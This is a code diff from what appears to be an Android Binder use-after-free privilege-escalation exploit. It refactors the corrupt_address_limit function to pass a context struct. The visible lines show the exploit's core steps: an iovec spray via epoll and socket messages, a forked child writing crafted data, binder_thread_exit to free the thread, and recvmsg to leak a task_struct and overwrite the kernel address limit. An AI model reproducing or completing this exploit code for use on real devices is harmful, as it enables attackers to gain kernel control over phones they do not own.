@@ -10,8 +10,8 @@
 #include "../include/event_poll.h"
 #include "../include/log.h"
 
-void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
-                           void **mapped_memory) {
+void corrupt_address_limit(binder_ctx *ctx,
+                           struct task_struct **leak_task_struct) {
   int sock_fd[2] = {0};
   ssize_t nBytesWritten = 0;
   struct iovec iovecStack[IOVEC_COUNT];
@@ -49,7 +49,7 @@ void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
 
   memset(iovecStack, 0, sizeof(iovecStack));
 
-  iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
+  iovecStack[IOVEC_WQ_INDEX].iov_base = ctx->mapped;
   iovecStack[IOVEC_WQ_INDEX].iov_len = 1;
 
   iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *)0xdeadbeef;
@@ -70,13 +70,13 @@ void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
   message.msg_iov = iovecStack;
   message.msg_iovlen = IOVEC_COUNT;
 
-  event_pool_add(epfd, binder_fd, &epoll_event_t);
+  event_pool_add(epfd, ctx->fd, &epoll_event_t);
 
   pid_t childPid = fork();
 
   if (childPid == 0) {
     sleep(2);
-    event_pool_remove(epfd, binder_fd, &epoll_event_t);
+    event_pool_remove(epfd, ctx->fd, &epoll_event_t);
     nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData));
 
     if (nBytesWritten != sizeof(finalSocketData)) {
@@ -87,7 +87,7 @@ void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
     exit(EXIT_SUCCESS);
   }
 
-  binder_thread_exit(binder_fd);
+  binder_thread_exit(ctx->fd);
 
   ssize_t nBytesReceived = recvmsg(sock_fd[0], &message, MSG_WAITALL);
 
